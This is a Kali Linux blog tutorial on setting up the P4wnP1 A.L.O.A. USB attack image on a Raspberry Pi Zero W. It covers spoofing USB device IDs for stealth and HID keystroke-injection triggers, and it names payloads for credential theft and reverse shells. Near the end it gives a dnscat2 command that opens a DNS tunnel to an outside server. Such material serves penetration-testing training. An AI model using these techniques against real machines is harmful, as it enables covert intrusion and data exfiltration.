---
title: "Community Showcase Raspberry Pi Zero W P4wnP1 ALOA"
date: Thu, 13 Oct 2022 00:00:00 +0000
draft: false
type: posts
---
# Community Showcase Raspberry Pi Zero W P4wnP1 ALOA

https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/kali-p4wnp1-banner.jpg



The Kali community has been hard at work (as always!), and we want to showcase what we think is a very cool project of Kali Linux on a Raspberry Pi Zero W, the &ldquo;P4wnP1 A.L.O.A. (A Little Offensive Application)&rdquo;. It takes the standard Kali Linux image and adds custom software and

The Kali community has been hard at work (as always!), and we want to showcase what we think is a very cool project of Kali Linux on a [Raspberry Pi Zero W](https://www.kali.org/docs/arm/raspberry-pi-zero-w/), the “**[P4wnP1 A.L.O.A.](https://www.kali.org/docs/arm/raspberry-pi-zero-w-p4wnp1-aloa/)** (**A** **L**ittle **O**ffensive **A**pplication)”.

It takes the standard Kali Linux image and adds custom software and some extra firmware designed for the Raspberry Pi Zero W to turn it into a **Swiss Army knife of attacks and exfiltration**.

This blog post will be a [brief overview](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#using-the-p4wnp1-aloa) of how to get started using the web interface, [setting up a trigger](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#creating-our-own-trigger) as well as [installing additional packages](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#installing-a-package-when-connected-in-client-mode) found in Kali Linux. There is a lot more to P4wnP1 than this blog post goes over, which is why we have included [additional reading material](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#other-resources) from the community which cover additional attack scenarios as well as more payloads that people have written if you want to go deeper!

If you have a Raspberry Pi Zero W, we highly recommend giving this image a try. We see this as a great tool in any tester’s toolkit!

Shopping List
-------------

-   [Raspberry Pi Zero W](https://www.kali.org/docs/arm/raspberry-pi-zero-w/) _(**not** Zero 2 W)_
-   Raspberry Pi Zero W [USB-A Add-on Board](https://www.makerfocus.com/products/usb-type-a-adapter-board-for-raspberry-pi-zero-w) (optional but recommended)
-   MicroUSB to USB-A cable (required if you are not using the above add-on board)
-   MicroSD card (32GB or larger)
-   [Kali Linux Raspberry Pi Zero W P4wnP1 A.L.O.A.](https://www.kali.org/get-kali/) image

Setting Up To Get Down To Business
----------------------------------

First thing, download the [Kali P4wnP1 A.L.O.A. image](https://www.kali.org/get-kali/#kali-arm). _At the time of writing, the current version is 2022.3:_

```console
kali@kali:~/Downloads$ ls
kali-linux-2022.3-raspberry-pi-zero-w-p4wnp1-aloa-armel.img.xz
```

* * *

We will verify the download as well, by going back to the download page and clicking on the `sum` link on the **Raspberry Pi Zero W (P4wnP1 A.L.O.A)** line to get the SHA256 checksum:

```console
kali@kali:~/Downloads$ echo "210635bb3dc7876b638a7035cd4dc60e0b134b19a6aec42a75f5995036b45840 kali-linux-2022.3-raspberry-pi-zero-w-p4wnp1-aloa-armel.img.xz" | sha256sum -c
kali-linux-2022.3-raspberry-pi-zero-w-p4wnp1-aloa-armel.img.xz: OK
```

* * *

Now that we have verified that we have downloaded the file and it matches, we write it to the microSD card, which on **our system** is `/dev/sdb` - on **your system this may be different**, **do NOT just copy and paste** what we have put here, because you **WILL** overwrite whatever you have on your system’s `/dev/sdb` if you do.

The `xzcat` command will open the compressed image file and pipe it to the `dd` command, which will do the actual writing to the microSD card. The use of `xzcat` is a quick trick, as it removes having to actually uncompress the image first:

```console
kali@kali:~/Downloads$ xzcat kali-linux-2022.3-raspberry-pi-zero-w-p4wnp1-aloa-armel.img.xz | sudo dd of=/dev/sdb bs=1M status=progress
[sudo] password for kali:
6421807104 bytes (6.4 GB, 6.0 GiB) copied, 101 s, 63.6 MB/s
0+577993 records in
0+577993 records out
6442450944 bytes (6.4 GB, 6.0 GiB) copied, 162.961 s, 39.5 MB/s
```

The speeds above are on our system, these will differ based on your system and the speed of the microSD card that you are using.

* * *

Now that this is done, we can unplug the microSD card from the machine, and plug it in to our Raspberry Pi Zero W. If you are using a USB-A adapter similar to what we linked to in the “[shopping list](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#shopping-list)” section, you can plug it in to your computer to power it on, otherwise power the Raspberry Pi Zero W via the micro port as usual.

Since the first boot of Kali Linux will do things like resize the filesystem, and set up the [default credentials](https://www.kali.org/docs/introduction/default-credentials/) (user: `kali`, password: `kali`) the timing will vary based on microSD card speed.

Using the P4wnP1 A.L.O.A.
-------------------------

Once it is booted, you will know everything is **ready to go, when you see the default wireless network**: `💥🖥💥 Ⓟ➃ⓌⓃ🅟❶`. _Handy if you do not have an HDMI monitor plugged in!_

Select the above SSID, and then we login with the **password**: `MaMe82-P4wnP1`.

[![](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/select-network-1.png)](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/select-network-1.png)

* * *

Now that we are connected, we should see our wireless device is connected and has an IP address in the `172.24.0.xxx/24` range:

```console
kali@kali:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
inet 127.0.0.1/8 scope host lo
valid_lft forever preferred_lft forever
inet6 ::1/128 scope host
valid_lft forever preferred_lft forever
2: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 4096
link/ether 00:03:7f:12:1f:ae brd ff:ff:ff:ff:ff:ff
inet 172.24.0.12/24 brd 172.24.0.255 scope global dynamic noprefixroute wlan0
valid_lft 297sec preferred_lft 297sec
```

We can see that the IP address of our `wlan0` adapter is `172.24.0.12`, so **we are connected**! Since we are successfully connected, lets pull up the web interface in our browser.

The **default IP** address of the P4wnP1 A.L.O.A image is `172.24.0.1` and the service listens on port `8000` so we go to [http://172.24.0.1:8000/](http://172.24.0.1:8000/) in our browser.

* * *

Upon login we can see the list at the top: **[USB Settings](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#usb-settings)**, **[Wi-Fi Settings](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#Wi-Fi-settings)**, **[Bluetooth](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#bluetooth)**, **[Network Settings](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#network-settings)**, **[Trigger Actions](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#trigger-actions)**, **[HIDScript](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#hidscript)**, **[Event Log](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#event-log)** and **[Generic Settings](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#generic-settings)**.

[![](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-default.png)](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-default.png)

One quick thing to note as we are going through the interface below. Under the navigation menu, each section has various buttons, depending on what screen is currently being shown. A legend for what these buttons mean:

Name

What it does

Deploy

Activate

Deploy Stored

Load something that is saved, and activate it

Reset

Return to default settings

Store

Save

Load Stored

Load something that has been saved

Run

Run the current HID Script

Load & Replace

Load a saved HID Script and Replace the current contents with it

Load & Prepend

Load a saved HID Script, and add it to the beginning of the current script

#### USB Settings

Here we can **change the Vendor ID (VID)** & **Product ID (PID) of the device**, so if you want to pretend to be a specific storage device, you can! You can also alter **Manufacturer Name** & **Product Name**, as well as the **serial number** if you really want to clone a certain device. _Great if you are trying to be stealthy and have done your homework by scoping out the environment._

You can also change various other settings to alter the behavior of how the USB device acts (allowing for keyboard, mouse, network support, mass storage, and even serial)!

_A nice resource to point out here is [The USB ID Repository](http://www.linux-usb.org/usb-ids.html), which is a large database of known values used for USB devices._

[![](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-default.png)](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-default.png)

#### Wi-Fi Settings

The Wi-Fi settings allows you **change the Wi-Fi SSID network name**, **password** (aka Pre Shared Key, PSK) as well as the **channel** which is being used. By altering these values, you can start to blend into the background by being less distinctive _(and more secure by not using default credentials)_!

To apply the settings, you will click on the “Deploy” button. Keep in mind, when you change the settings and hit “Deploy” you will be disconnected and need to reconnect with your new settings.

[![](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-wifi-settings.png)](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-wifi-settings.png)

The default Wi-Fi mode is **Access Point (AP)**, which allows for other devices to connect to P4wnP1’s wireless network.

Alternatively, you can also set the P4wnP1 to be a **client** (client mode) on the network, instead of a AP. Using the pre-defined configurations, P4wnP1 will then connect to the network and behave like another device on the network.

The final option, **Client with Fallover to AP**, gives you the “best of both worlds” as P4wnP1 will attempt to connect as a client, and if that fails, then switch to being a Access Point. Neat!

For example, we will set it up in this fall over mode. So if the `kali Wi-Fi network` is in range and has the correct key, it should connect to that as a client, if not, if we are not in range, or it cannot see it, it will start up the access point `network`.

[![](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-wifi-client-with-failover-ap.png)](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-wifi-client-with-failover-ap.png)

If the airwaves are being monitored, you can simply disable the Wi-Fi network as well.

#### Bluetooth

Moving on, we have the Bluetooth settings.

In this section, we can enable or disable Bluetooth. If **discoverable**, we can set the **Bluetooth name**, (with the default being `P4wnP1`). We can also set the **Bluetooth PIN** used to connect (the default PIN is `1337`) - PIN is only used if “Secure Simple Pairing (SSP)” is turned off.

[![](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-bluetooth.png)](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-bluetooth.png)

* * *

For the Bluetooth network settings, the **P**ersonal **A**rea **N**etwork profile (PAN) is used. Keep in mind that you typically have a range of 10 meters (33 ft) with Bluetooth connections.

Some quick definitions for people who may not be familiar with Bluetooth Personal Area Network profiles:

Profile

Definition

PANU

Peer-to-Peer connection (one to one)

PAN-GN

Group Ad-hoc Network (GN) of up to 8 devices

PAN-NAP

Network Aggregation Point (NAP) can bridge the Bluetooth connection to the wireless connection

So if you set the P4wnP1 to be in PAN-NAP (the default), you can connect up to 10 devices to the P4wnP1 over Bluetooth and share its network connection that way.

If you were to set it up with PAN-GN, then up to 7 additional devices could connect to the P4wnP1, and can communicate with each other but there is no Internet access.

And if you were to use PANU, then you can only transfer data between the device connected to the P4wnP1 and the P4wnP1 itself.

#### Network Settings

The next tab is Network Settings, where we can change the options for the **different ways of connecting to the P4wnP1**.

You can connect via **Bluetooth (bteth)**, **USB (usbeth)**, or as we currently are, via **Wi-Fi (wlan0)**.

To make any changes, you select the interface, and make the change for that interface, including using **DHCP** or setting **static IP** values. You can also alter some DHCP options here. Under the hood, [dnsmasq](https://manpages.debian.org/testing/dnsmasq-base/dnsmasq.8.en.html) is being used.

For example, you may wish to have Wi-Fi set to client mode, using the network DHCP server and have Bluetooth enabled as a fallback interface, which is running a DHCP server.

[![](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-network-settings.png)](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-network-settings.png)

#### Trigger Actions

Now we have triggers.

Triggers are the main way of doing things with the P4wnP1, when certain conditions are met. You can **think of a trigger action as a payload**. Whatever you set up here, **if the conditions are met, the actions you set happen**.

[![](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-actions.png)](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-actions.png)

* * *

Triggers are very powerful, and the sky is the limit when creating them. To get your feet wet, some trigger actions are:

-   Service started - _Do something when a service has started on the P4wnP1_
-   USB gadget connected to host - _Do something when the P4wnP1 is connected to a host_
-   USB gadget disconnected from host - _Do something when the P4wnP1 is disconnected from a host_
-   Wi-Fi Access Point is up - _Do something when the P4wnP1’s access point is up_
-   Joined existing Wi-Fi - _Do something when the P4wnP1 joins a Wi-Fi network as a client_
-   DHCP lease issued - _Do something when a DHCP lease is issued to a device connected to the P4wnP1_
-   Input on GPIO - _Do something based on the Raspberry Pi GPIO pins input_
-   SSH user login - _Do something when a user logs in to the P4wnP1 via SSH_

If you want to dig a little deeper _(and keep your workflow simpler with meaningful naming values)_, you can use **group channels**. As the name suggests, you can group actions together. This then allows for easier to read rules, as well as more complex logic. These options are:

-   A value on a group channel - _Do something when a specific value on a group channel matches_
-   Multiple values on a group channel - _Do something once multiple values on a group channel match_

Example scenario of this could have the end result to “run a bash script on the P4wnP1”, but the conditions for this to happen is when “Wi-Fi Access Point is up” as well as “USB gadget connected to host” are both met. So you create a few triggers:

-   On “Wi-Fi Access Point is up” -> send value “1” to group “connected”
-   On “USB gadget connected to host” -> send value “2” to group “connected”

We can go even more complex logic with the rules with making the third trigger. We can control the ordering using “exact ordered sequence”. So does it matter if the device is plugged in before the Wi-Fi access point is up? By using:

-   `type "All (logical AND)"` the **ordering does not matter** in order to do the action
-   `exact ordered sequence` the **order matters** in order to trigger the action

With what we have in mind, we do not require a certain sequence of events so we use `multiple values on group channel"; values (1,2); type "All (logical AND)" -> Start bash script`.

Something else to keep in mind when coming up with ideas, you can enable “one shot” mode, which will only trigger once, rather than every time the event happens. Handy if the P4wnP1 is disguised as another device, it can then behave “normally” after running the payload the first time.

#### HIDScript

Moving on to the HIDScript tab, if you have ever used [DuckyScript](https://github.com/hak5/usbrubberducky-payloads), HIDscripts are similar, but based upon JavaScript rather than bash.

“HIDScripts” run on Raspberry Pi device and they interact with the enumerated “fake” hardware which is connected externally, however “bash scripts” run on the Raspberry Pi OS “internal”.

To get you started, P4wnP1 pre-populates with a simple HIDScript (called `hidtest1.js`) that will launch notepad on a Windows computer, types out a phrase, then moves the mouse, and then repeats it without any delays. More about this can be found in our [example trigger](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#creating-our-own-trigger).

[![](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-hidscript.png)](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-hidscript.png)

* * *

In the [Other Resources](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#other-resources) at the end of this post you can find additional payloads that people have written, if you want, or need, some inspiration, such as:

-   Extract Chrome and Internet Explorer credentials as well as any stored Wi-Fi networks information, and copy them to the P4wnP1
-   Open a webpage
-   Run an command as administrator on the target system the P4wnP1 is plugged in to
-   Using just PowerShell commands, create a reverse shell with administrator rights

To help create and debug HIDscripts, you can click the `RUN` button at any time to execute, rather than having do the events of a trigger action.

#### Event Log

The Event Log tab is where events are logged, if you have set up any triggers to log.

The Event Log is _only_ for P4wnP1 A.L.O.A. events, and does not include logs on the system itself.

This is useful for debugging any payloads and triggers you are writing, tracking process of actions, and retrieving contents of payloads,

[![](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-eventlog.png)](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-eventlog.png)

#### Generic Settings

And finally we have our Generic Settings, where we can do things like use the **Master Template Editor** to control what the defaults are every time it boots as well as **Reboot** or **Shutdown** the P4wnP1 device, and also make a **backup** or **restore** the P4wnP1 database (so your settings and hard work is preserved).

[![](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-generic-settings.png)](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-generic-settings.png)

Creating our own Trigger
------------------------

Now that we have covered using the web interface of the P4wnP1 A.L.O.A., let’s put the information we have gained into practice. As an example, lets set the P4wnP1 up so that when we:

**Plug the P4wnP1 into a Windows machine** while **in USB gadget mode**, **it will run the default [HIDScript](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#hidscript) `hidtest1.js`** to run a command and move the mouse about.

First, let’s go into the web interface and click on trigger actions:

[![](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-actions.png)](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-actions.png)

* * *

Then we will click on **Add One**, which brings up the following modal window and in order to change any settings, **it has to be enabled**, so we will quickly do that too:

[![](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-enabled.png)](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-enabled.png)

* * *

In this case, we will choose: `USB gadget connected to host`:

[![](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-usb-gadget-connected-to-host.png)](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-usb-gadget-connected-to-host.png)

* * *

Now we select the action to take, which is “Start a [HIDScript](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#hidscript)”:

[![](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-action-start-HID.png)](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-action-start-HID.png)

* * *

Now we choose which [HIDScript](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#hidscript) to load. For this example we will load the default HIDscript that is written, called `hidtest1.js`, which will launch notepad, type out “Hello from P4wnP1 run” and then move the mouse to the right, then left, and then it will do it again, but much faster, to show the speed at which the P4wnP1 can run them.

_Any HIDScripts that you write, or get from the community, will show up in this list once they are added to your P4wnP1. The list below are just the default ones that come with the P4wnP1._

[![](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-hid-select-hidtest.png)](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-hid-select-hidtest.png)

* * *

Lastly, to save our trigger, we click the `Update` button:

[![](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-hid-update.png)](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-trigger-add-hid-update.png)

Happy hacking!

Installing A Package When Connected over SSH
--------------------------------------------

When you have Internet access on the P4wnP1, you have the full arsenal of Kali’s repositories available to you. So any package you can install in Kali on a Raspberry Pi Zero W will be available for use in bash scripts you may write. You can access those scripts via [triggers](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#trigger-actions).

However you are connected to P4wnP1, you can SSH in using either the `kali` and `root` users. The [default credentials](https://www.kali.org/docs/introduction/default-credentials/) are:

-   `kali` / `kali`
-   `root` / `toor`

We are now going to install the package [dnscat2-client](https://www.kali.org/tools/dnscat2/) on P4wnP1, then connect to a [dnscat2-server](https://www.kali.org/tools/dnscat2/#dnscat2-server) we have already set up somewhere else.

As a reminder, we always want to run `sudo apt update` before installing packages, to ensure we get the latest version:

```console
kali@kali-raspberry-pi-zero-w-p4wnp1-aloa:~$ sudo apt update
[...]
kali@kali-raspberry-pi-zero-w-p4wnp1-aloa:~$
kali@kali-raspberry-pi-zero-w-p4wnp1-aloa:~$ sudo apt -y install dnscat2-client
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
Suggested packages:
dnscat2-server
The following NEW packages will be installed:
dnscat2-client
0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.
[...]
```

Now, we can just simply run the suggested command when setting up `dnscat2-server` on our other machine:

```console
kali@kali-raspberry-pi-zero-w-p4wnp1-aloa:~$ dnscat --dns server=10.0.13.37,port=53 --secret=5672ddb107fe2f33e490a83e8d1036ca
Creating DNS driver:
domain = (null)
host = 0.0.0.0
port = 53
type = TXT,CNAME,MX
server = 10.0.13.37
** Peer verified with pre-shared secret!
Session established!
```

Happy hacking (again)!

Credits
-------

The [original](https://p4wnp1.readthedocs.io/) author of P4wnP1 A.L.O.A. is [Marcus Mengs aka MaMe82](https://twitter.com/mame82).

[Rogan Dawes](https://github.com/rogandawes) took over maintainership when Marcus needed to step away.

Reminder
--------

We love seeing what the community builds on top of Kali Linux, if you are working on a project let us know!

You can reach out to us on [Twitter](https://twitter.com/kalilinux) or on our [Discord](https://discord.kali.org/).

Other Resources
---------------

**Project Resources**:

-   [P4wnP1 A.L.O.A. Homepage](https://github.com/RoganDawes/P4wnP1_aloa)
-   [P4wnP1 Twitter](https://twitter.com/P4wnP1)

**Kali Resources**:

-   [Kali Linux P4wnP1 A.L.O.A. Documentation](https://www.kali.org/docs/arm/raspberry-pi-zero-w-p4wnp1-aloa/)

**Community Resources**:

-   [A Case for P4wnP1 with a spot for an OLED screen](https://thingiverse.com/thing:2701424)
-   [A Menu to use with an OLED screen on the P4wnP1 A.L.O.A](https://github.com/FuocomanSap/P4wnp1-ALOA-Menu-Reworked)
-   [Additional Payloads for P4wnP1 A.L.O.A.](https://github.com/beboxos/P4wnP1-ALOA-HID-payloads)
-   [Hacking with the Raspberry Pi Zero W](https://levelup.gitconnected.com/hacking-with-the-raspberry-pi-zero-w-8520a4d72b2e)
-   [Kali Linux P4wnP1 A.L.O.A. Guide – Setup / Usage / Examples](https://jamesachambers.com/kali-linux-p4wnp1-aloa-guide-setup-usage-examples)
-   [P4wnP1 A.L.O.A.— An advanced HID attack device](https://medium.com/azkrath/p4wnp1-a-l-o-a-an-advanced-hid-attack-device-d906ae5bf48c)
-   [Pi Zero as a HID \\ USB Device (P4wnP1 A.L.A.O)](https://tenaka.net/p4wnp1-hid-attack)
-   [Video about using an OLED screen with the P4wnP1 A.L.O.A](https://youtube.com/watch?v=s0K-YIL_G5c)
-   [Windows HID payload generator](https://github.com/federicodotta/LetMeHID)

#### [Source](https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/)

<br/>
---
